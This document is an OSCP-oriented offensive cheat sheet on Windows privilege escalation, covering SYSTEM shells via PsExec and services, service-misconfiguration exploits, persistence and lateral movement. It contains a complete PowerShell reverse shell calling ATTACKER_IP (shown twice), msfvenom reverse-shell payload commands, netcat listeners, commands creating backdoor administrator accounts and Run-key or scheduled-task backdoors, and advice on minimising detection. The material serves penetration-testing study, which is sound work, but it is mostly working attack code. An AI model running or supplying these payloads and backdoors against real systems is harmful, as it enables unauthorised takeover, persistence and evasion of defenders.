# Spawning Administrator/SYSTEM Shells in Windows

This document covers techniques for spawning administrator and SYSTEM-level shells after gaining initial access to a Windows system.

## Elevating Regular User to Administrator

### Adding User to Administrators Group

If you have administrator credentials or compromised an admin-level account, you can add a regular user to the administrators group:

```cmd
net localgroup administrators <username> /add
```

After this, you can use that user account to open an elevated command prompt or access privileged resources.

### Using RunAs to Execute Commands as Administrator

If you have administrator credentials but are logged in as a regular user:

```cmd
runas /user:Administrator cmd.exe
```

### Creating a New Administrator User

```cmd
net user hackerman Password123 /add
net localgroup administrators hackerman /add
```

## Escalating from Administrator to SYSTEM

### Using PSExec

PSExec is a powerful tool from Microsoft's Sysinternals suite that allows you to execute processes on remote systems with SYSTEM privileges.

#### PSExec Local Usage for SYSTEM Shell

```cmd
# Download from Microsoft's website
# https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

# Execute cmd.exe as SYSTEM
PsExec64.exe -i -s cmd.exe

# Execute PowerShell as SYSTEM
PsExec64.exe -i -s powershell.exe
```

#### PSExec Remote Usage

```cmd
# Access remote system (requires admin credentials)
PsExec64.exe \\remote_host -u Domain\Administrator -p Password cmd.exe

# Execute with SYSTEM privileges on remote system
PsExec64.exe \\remote_host -u Domain\Administrator -p Password -s cmd.exe
```

### Using Service Creation for SYSTEM Shell

Creating and starting a service that executes a command will run that command as SYSTEM:

```cmd
# Create a service that launches cmd.exe
sc create mysvc binpath= "cmd.exe /k start"
sc start mysvc
```

## Remote Access with GUI

### RDP Access After Privilege Escalation

After adding a user to the administrators group, you can use RDP to connect with a GUI interface:

```cmd
# Enable RDP if it's disabled
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Add firewall exception for RDP
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Connect using RDP client from Kali
xfreerdp /v:<target-ip> /u:<username> /p:<password> /dynamic-resolution
```

## Payload Generation with MSFvenom

MSFvenom can create payloads that establish privileged shells when executed on the target.

### Generating Reverse Shell Payloads

```bash
# Windows reverse shell executable (stageless)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-ip> LPORT=4444 -f exe -o reverse_shell.exe

# Windows reverse shell executable (staged, better for AV evasion)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f exe -o reverse_met.exe

# PowerShell payload
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<your-ip> LPORT=4444 -f psh -o reverse_shell.ps1
```

### Getting the Payload to Execute with High Privileges

1. **Scheduled Task Method**:
   ```cmd
   # Create task that runs as SYSTEM
   schtasks /create /tn "SystemTask" /tr "c:\path\to\reverse_shell.exe" /sc once /st 23:59 /ru "SYSTEM"
   schtasks /run /tn "SystemTask"
   ```

2. **Service Method**:
   ```cmd
   # Create service pointing to your payload
   sc create ReverseSvc binpath= "c:\path\to\reverse_shell.exe" start= auto
   sc start ReverseSvc
   ```

## Maintaining Access

### Creating Persistent Administrator Backdoors

```cmd
# Scheduled task persistence
schtasks /create /tn "Backdoor" /tr "c:\path\to\backdoor.exe" /sc onlogon /ru "SYSTEM"

# Registry persistence (Run key)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "c:\path\to\backdoor.exe"
```

## Lateral Movement with Administrator/SYSTEM Shells

### WMI for Remote Execution

```cmd
# Execute command on remote system
wmic /node:"remote-host" /user:"domain\admin" /password:"password" process call create "cmd.exe /c payload.exe"
```

### PowerShell Remoting

```powershell
# Enable PS Remoting if needed
Enable-PSRemoting -Force

# Connect to remote system
Enter-PSSession -ComputerName remote-host -Credential domain\admin

# Execute commands with Invoke-Command
Invoke-Command -ComputerName remote-host -Credential domain\admin -ScriptBlock {whoami}
```

## OSCP Exam Notes

For the OSCP exam, focus on:

1. Adding users to the administrators group when you have admin access
2. Using PSExec to get SYSTEM shells from administrator accounts
3. Setting up RDP access for easier post-exploitation
4. Simple MSFvenom payloads for getting reverse shells
5. Using built-in Windows commands rather than external tools when possible

Remember that PSExec and other admin-level activities will likely trigger antivirus or EDR solutions in real environments. For the OSCP, focus on using these techniques in ways that minimize detection.

# Windows Service Exploitation

Windows services often run with high privileges and can be exploited in various ways for privilege escalation. This document covers common techniques to identify and exploit vulnerable services.

## Service Commands

### Basic Service Management Commands

```cmd
# Query the configuration of a service
sc qc <service_name>

# Query the current status of a service
sc query <service_name>

# Modify a configuration option of a service
sc config <service_name> <option>= <value>

# Start or stop a service
net start <service_name>
net stop <service_name>

# Alternative start/stop commands
sc start <service_name>
sc stop <service_name>

# List all services
sc query type= service state= all

# List running services
sc queryex type= service state= active

# Display all service dependencies
sc qc <service_name> | findstr "DEPENDENCIES"

# Get the security descriptor of a service
sc sdshow <service_name>
```

### PowerShell Service Commands

```powershell
# Get all services
Get-Service

# Get specific service
Get-Service -Name <service_name>

# Get running services
Get-Service | Where-Object {$_.Status -eq "Running"}

# Get service with additional details
Get-WmiObject -Class Win32_Service | Select-Object Name, DisplayName, State, PathName, StartMode, StartName

# Start and stop services
Start-Service -Name <service_name>
Stop-Service -Name <service_name>

# Check service permissions (requires admin)
Get-ServiceAcl -Name <service_name>
```

## Understanding Windows Services

Services are managed by the Service Control Manager (SCM) and typically run with SYSTEM, LocalService, NetworkService, or custom service account privileges. Each service has:

- An executable path (BINARY_PATH_NAME)
- A service account (SERVICE_START_NAME)
- A Discretionary Access Control List (DACL) controlling who can modify the service

### Service Permission Types

Each service has an Access Control List (ACL) which defines service-specific permissions:

- **SERVICE_QUERY_CONFIG**: Allows querying service configuration (innocuous)
- **SERVICE_QUERY_STATUS**: Allows checking service status (innocuous)
- **SERVICE_STOP**: Allows stopping the service (potentially useful)
- **SERVICE_START**: Allows starting the service (potentially useful)
- **SERVICE_CHANGE_CONFIG**: Allows changing service configuration (dangerous)
- **SERVICE_ALL_ACCESS**: Provides full control over the service (dangerous)

### Exploitation Potential

The exploitation potential depends on the combination of permissions you have:

1. **Ideal scenario**: Having SERVICE_CHANGE_CONFIG and either SERVICE_STOP or SERVICE_START (or both)
2. **Limited scenario**: Having SERVICE_CHANGE_CONFIG but no ability to stop/start

> **Potential Rabbit Hole**: If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges immediately. The changes will only take effect when the service is restarted, which might require:
> - Waiting for a system reboot
> - Waiting for an automated service restart
> - Finding another vulnerability to trigger a service restart

## Checking Service Configuration

```cmd
# Query service configuration
sc qc SERVICE_NAME

# Example
sc qc wuauserv
```

Key information to look for:
- BINARY_PATH_NAME: The path to the executable
- SERVICE_START_NAME: The account used to run the service

## Method 1: Insecure Permissions on Service Executable

If the service's executable has weak permissions allowing modification, we can replace it with a malicious executable.

### Identifying Vulnerable Services

```cmd
# Check service executable permissions
icacls "C:\path\to\service.exe"

# Look for permissions like:
# - BUILTIN\Users:(F) or (M) - Full control or Modify
# - Everyone:(F) or (M)
# - Authenticated Users:(F) or (M)
```

### Exploitation Steps

1. Generate a malicious executable:
   ```bash
   # On Kali Linux:
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o malicious.exe
   ```

2. Create a listener:
   ```bash
   nc -lvp 4445
   ```

3. Transfer the executable to Windows target (using wget, certutil, etc.)

4. Replace the service executable:
   ```cmd
   # Backup original (optional)
   move C:\path\to\service.exe C:\path\to\service.exe.bak
   
   # Copy malicious executable
   copy malicious.exe C:\path\to\service.exe
   
   # Ensure proper permissions
   icacls C:\path\to\service.exe /grant Everyone:F
   ```

5. Restart the service:
   ```cmd
   sc stop SERVICE_NAME
   sc start SERVICE_NAME
   ```

## Method 2: Unquoted Service Paths

When a service's path contains spaces and isn't enclosed in quotes, Windows will try to execute each valid path with spaces.

### Identifying Vulnerable Services

```cmd
# Find services with unquoted paths containing spaces
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell alternative
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notmatch "`"" -and $_.PathName -match " "} | Select-Object Name, PathName, StartMode
```

### How It Works

For a service with path `C:\Program Files\Vulnerable Service\service.exe`, Windows tries to execute:
1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable Service\service.exe`

### Exploitation Steps

1. Identify a writable directory in the service path:
   ```cmd
   # Check directory permissions
   icacls "C:\Program Files"
   icacls "C:\Program Files\Vulnerable Service"
   ```

2. Generate a malicious executable:
   ```bash
   # On Kali Linux
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o malicious.exe
   ```

3. Create a listener:
   ```bash
   nc -lvp 4446
   ```

4. Place the malicious executable in the path with proper name:
   ```cmd
   # Example: exploiting "C:\Program Files\Vulnerable Service\service.exe"
   copy malicious.exe "C:\Program Files\Vulnerable.exe"
   
   # Ensure proper permissions
   icacls "C:\Program Files\Vulnerable.exe" /grant Everyone:F
   ```

5. Restart the service:
   ```cmd
   sc stop "Vulnerable Service"
   sc start "Vulnerable Service"
   ```

## Method 3: Insecure Service Permissions

If a service's DACL allows modification, we can reconfigure the service to run any executable as SYSTEM.

### Identifying Vulnerable Services

```cmd
# Using AccessChk (Sysinternals)
accesschk64.exe -qlc SERVICE_NAME

# Look for:
# - SERVICE_ALL_ACCESS
# - SERVICE_CHANGE_CONFIG
# For non-admin groups like BUILTIN\Users, Everyone, Authenticated Users
```

### Exploitation Steps

1. Generate a malicious executable:
   ```bash
   # On Kali Linux
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o malicious.exe
   ```

2. Create a listener:
   ```bash
   nc -lvp 4447
   ```

3. Transfer and prepare the executable:
   ```cmd
   # Ensure proper permissions
   icacls malicious.exe /grant Everyone:F
   ```

4. Reconfigure the service:
   ```cmd
   # Change the binary path and account (note the spaces after the equal signs)
   sc config SERVICE_NAME binPath= "C:\path\to\malicious.exe" obj= LocalSystem
   ```

5. Restart the service:
   ```cmd
   sc stop SERVICE_NAME
   sc start SERVICE_NAME
   ```

### Dealing with Start/Stop Restrictions

If you can change the service configuration but cannot start or stop it:

1. **Option 1**: Modify the executable to execute at the next system reboot
   ```cmd
   sc config SERVICE_NAME binPath= "C:\path\to\malicious.exe" start= auto
   # Wait for reboot or find a way to force one
   ```

2. **Option 2**: Target a service that automatically restarts when it crashes
   ```cmd
   # Check if the service has a recovery action
   sc qfailure SERVICE_NAME
   ```

3. **Option 3**: Look for services that are frequently restarted by the system or users

## Using RunAs to Execute Commands as Another User

The `runas` command allows you to run programs as another user, which can be useful for privilege escalation when you have credentials for a higher-privileged account.

### Basic RunAs Usage

```cmd
# Basic syntax
runas /user:DOMAIN\username "command"

# Execute command prompt as Administrator
runas /user:Administrator cmd.exe

# Specify a domain
runas /user:DOMAIN\Administrator cmd.exe

# Open a program with a specific user
runas /user:Administrator "notepad.exe C:\Windows\System32\drivers\etc\hosts"
```

### Using Saved Credentials

By default, `runas` doesn't accept pre-supplied passwords. However, you can use the `/savecred` option if the user has previously saved credentials:

```cmd
# Use saved credentials (if available)
runas /savecred /user:Administrator cmd.exe
```

> Note: The `/savecred` option only works if the user has previously saved credentials using the same command with valid credentials.

### RunAs with PowerShell and Supplied Password

Since `runas` doesn't allow direct password input, you can use PowerShell to achieve this:

```powershell
# Create a credential object
$username = "Administrator"
$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)

# Start a process with these credentials
Start-Process -FilePath "cmd.exe" -Credential $cred
```

### Starting a Service with Alternative Credentials

```cmd
# Start a service as a different user
sc.exe config SERVICE_NAME obj= "DOMAIN\username" password= "Password123!"
sc.exe start SERVICE_NAME
```

### Exploiting RunAs for Privilege Escalation

1. **When you have discovered credentials** (from credential hunting):
   ```cmd
   runas /user:Administrator "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add"
   ```

2. **Establishing a reverse shell as the privileged user**:
   ```powershell
   # Create PowerShell reverse shell script (save as rev.ps1)
   $client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", 4444);
   $stream = $client.GetStream();
   [byte[]]$bytes = 0..65535|%{0};
   while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
       $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
       $sendback = (Invoke-Expression $data 2>&1 | Out-String);
       $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
       $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
       $stream.Write($sendbyte,0,$sendbyte.Length);
       $stream.Flush()
   };
   $client.Close();
   
   # Execute as the privileged user
   runas /user:Administrator "powershell.exe -ExecutionPolicy Bypass -File C:\path\to\rev.ps1"
   ```

### Limitations of RunAs

- Requires knowing the user's password
- By default, doesn't accept pre-supplied passwords
- Creates a new logon session (doesn't inherit current session's network shares or mapped drives)
- May require desktop interaction depending on system settings
- May trigger User Account Control (UAC) prompts

## Real-World Example 1: Exploiting Unquoted Service Path

For a service with configuration like:

```cmd
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```

Check if we can write to the directory:

```cmd
C:\> icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

The BUILTIN\Users group has write permissions. We can exploit this:

```cmd
# Place malicious executable in the path
C:\> move malicious.exe C:\MyPrograms\Disk.exe

# Set permissions
C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F

# Restart service
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

## Real-World Example 2: Exploiting Insecure Service Permissions

For a service with insecure DACL:

```cmd
C:\> accesschk64.exe -qlc THMService
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

We can reconfigure it:

```cmd
# Reconfigure service
C:\> sc config THMService binPath= "C:\Users\user\malicious.exe" obj= LocalSystem

# Restart service
C:\> sc stop THMService
C:\> sc start THMService
```

## Detection and Prevention

To prevent service-based privilege escalation:

1. Use quotes for service paths with spaces
2. Restrict write access to service executables and directories
3. Set proper DACLs on services to prevent reconfiguration
4. Run services with least privilege accounts
5. Regularly audit service configurations and permissions

## Alternative Payload Generation (Without msfvenom)

If you don't have access to msfvenom, you can create a simple service executable with C# or PowerShell:

```powershell
# PowerShell reverse shell (save as .ps1)
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();

# Create a .bat wrapper to call PowerShell
echo powershell.exe -ExecutionPolicy Bypass -File C:\path\to\reverse-shell.ps1 > malicious.bat
```

## Additional Tools For Enumeration

- **PowerUp.ps1**: `Invoke-AllChecks` identifies many common service vulnerabilities
- **WinPEAS**: Checks for service misconfigurations automatically
- **ServicePermissionsChecker.ps1**: Custom PowerShell script to check service permissions 